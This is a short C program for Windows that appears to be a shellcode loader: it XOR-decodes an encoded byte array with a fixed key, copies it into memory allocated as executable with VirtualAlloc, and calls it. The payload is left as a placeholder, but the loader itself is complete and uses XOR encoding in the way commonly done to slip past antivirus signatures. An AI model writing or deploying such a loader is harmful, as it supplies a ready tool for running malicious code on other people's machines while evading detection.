#include <stdio.h>
#include <windows.h>


unsigned char code[] = "<XOR-ED PAYLOAD HERE>";
int main()
{
	// Feel free to play around with this key
	char key = 'K';
	int i = 0;
	for (i; i<sizeof(code) - 1; i++)
	{
		code[i] = code[i]^key;
	}
	
	
	void *exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof code);
	((void(*)())exec)();
	return 0;
	
}
